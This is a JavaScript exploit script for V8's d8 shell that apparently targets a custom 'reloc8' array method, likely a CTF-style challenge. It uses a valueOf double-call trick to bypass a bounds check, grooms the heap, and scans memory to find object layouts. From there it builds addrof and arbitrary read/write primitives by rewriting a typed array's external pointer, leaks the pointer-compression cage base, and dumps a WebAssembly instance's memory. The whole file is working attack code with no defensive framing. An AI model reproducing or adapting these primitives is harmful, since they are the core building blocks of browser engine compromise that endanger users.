// t3.js — reloc8: full arbitrary R/W + cage leak + addrof + wasm instance walk
// local dev run: ./d8 --allow-natives-syntax t3.js

// ===== pre-groom: all allocation-heavy setup =====
// wasm module: (module (func (export "f") (result i32) i32.const 42))
const wbytes = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
  0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
  0x03,0x02,0x01,0x00,
  0x07,0x05,0x01,0x01,0x66,0x00,0x00,
  0x0a,0x06,0x01,0x04,0x00,0x41,0x2a,0x0b
]);
const wmod  = new WebAssembly.Module(wbytes);
const winst = new WebAssembly.Instance(wmod);
const wf    = winst.exports.f;

const cvBuf   = new ArrayBuffer(8);
const cvF     = new Float64Array(cvBuf);
const cvU     = new Uint32Array(cvBuf);
const NSCAN   = 512;
const scanBuf = new ArrayBuffer(8 * NSCAN);
const scanF   = new Float64Array(scanBuf);
const dumpU   = new Uint32Array(128);

// reloc8 args: valueOf returns 0 on 1st (bounds-checked) call, .v on 2nd
const fromArg = { n: 0, v: 0,
  valueOf() { this.n++; if (this.n === 1) return 0; this.n = 0; return this.v; } };
const toArg   = { n: 0, v: 0,
  valueOf() { this.n++; if (this.n === 1) return 0; this.n = 0; return this.v; } };

%DebugPrint(winst);

// ===== groom: five consecutive objects; NO allocation below until final output =====
const arr   = new Array(100).fill(1.1);
const ta    = new Float64Array(0x1337);   // byte_length 0x99b8, off-heap backing
const probe = new Uint8Array(16);         // on-heap: external = cage_base+7
const oarr  = [{}];                       // PACKED_ELEMENTS: addrof slot
const rw    = [1.1];                      // double slot: source for ext writes

// ===== scan (allocation-free; results land in preallocated typed arrays) =====
for (let k = 0; k < NSCAN; k++) {
  fromArg.n = 0; toArg.n = 0;
  fromArg.v = k; toArg.v = 0;
  arr.reloc8(fromArg, toArg);          // arr[0] = grid word k
  scanF[k] = arr[0];
}
function lo(k) { cvF[0] = scanF[k]; return cvU[0]; }
function hi(k) { cvF[0] = scanF[k]; return cvU[1]; }

// ta: byte_length word [0x99b8,0], byte_offset word before it [0,0]
let taLenIdx = -1;
for (let k = 4; k < NSCAN - 4; k++)
  if (lo(k) === 0x99b8 && hi(k) === 0 && lo(k-1) === 0 && hi(k-1) === 0 &&
      (lo(k+2) !== 0 || hi(k+2) !== 0)) { taLenIdx = k; break; }
const taExtIdx = taLenIdx + 2;          // raw external_pointer word

// probe: word j-1 == [0x11, 7] (ext low half = cage+7), word j lo = cage>>32
let cageWordIdx = -1;
for (let j = taLenIdx + 1; j < NSCAN - 1; j++)
  if (lo(j-1) === 0x11 && hi(j-1) === 7) { cageWordIdx = j; break; }
const cageHi = cageWordIdx >= 0 ? lo(cageWordIdx) : 0;

// oarr elements: FixedArray[1] header [0x5dd, Smi 2] (either alignment)
let oarrElemIdx = -1, oarrAligned = true;
for (let c = cageWordIdx; c < NSCAN - 2; c++) {
  if (lo(c) === 0x5dd && hi(c) === 2) { oarrElemIdx = c; oarrAligned = true; break; }
  if (hi(c) === 0x5dd && lo(c+1) === 2) { oarrElemIdx = c; oarrAligned = false; break; }
}
const oarrContentIdx = oarrElemIdx + 1;

// rw data: 1.1 bits with FixedDoubleArray[1] Smi-len word before it
let rwIdx = -1;
for (let m = oarrElemIdx; m < NSCAN; m++)
  if (lo(m) === 0x9999999a && hi(m) === 0x3ff19999 && hi(m-1) === 2) { rwIdx = m; break; }

// ===== primitives (allocation-free) =====
function addrofComp(o) {               // -> compressed tagged ptr
  oarr[0] = o;
  fromArg.n = 0; toArg.n = 0;
  fromArg.v = oarrContentIdx; toArg.v = 0;
  arr.reloc8(fromArg, toArg);
  cvF[0] = arr[0];
  return oarrAligned ? cvU[0] : cvU[1];
}
function setExt(alo, ahi) {            // ta.external_pointer = ahi:alo
  cvU[0] = alo; cvU[1] = ahi;
  rw[0] = cvF[0];
  fromArg.n = 0; toArg.n = 0;
  fromArg.v = rwIdx; toArg.v = taExtIdx;
  arr.reloc8(fromArg, toArg);          // grid[rwIdx] -> ta external word
}
function arbReadInto(alo, ahi, off) {  // 8 bytes at ahi:alo -> dumpU[off], dumpU[off+1]
  setExt(alo, ahi);
  cvF[0] = ta[0];
  dumpU[off] = cvU[0]; dumpU[off+1] = cvU[1];
}

// ===== walk wasm instance =====
const instComp = addrofComp(winst);
const instLo = instComp - 1;           // untagged offset within cage (cage lo32 = 0)
for (let w = 0; w < 40; w++) arbReadInto(instLo + 8*w, cageHi, 2*w);

// ===== output =====
function h8(x) { let s = x.toString(16); while (s.length < 8) s = "0" + s; return s; }
const out = [];
out.push("taLenIdx=" + taLenIdx + " taExtIdx=" + taExtIdx +
         " cageWordIdx=" + cageWordIdx + " cage=0x" + cageHi.toString(16) + "00000000" +
         " oarrElemIdx=" + oarrElemIdx + " aligned=" + oarrAligned +
         " rwIdx=" + rwIdx);
out.push("instComp=0x" + instComp.toString(16) + " full=0x" + cageHi.toString(16) + h8(instLo));
for (let w = 0; w < 40; w++)
  out.push("inst+" + (8*w) + " = 0x" + h8(dumpU[2*w+1]) + h8(dumpU[2*w]));
throw out.join("\n");
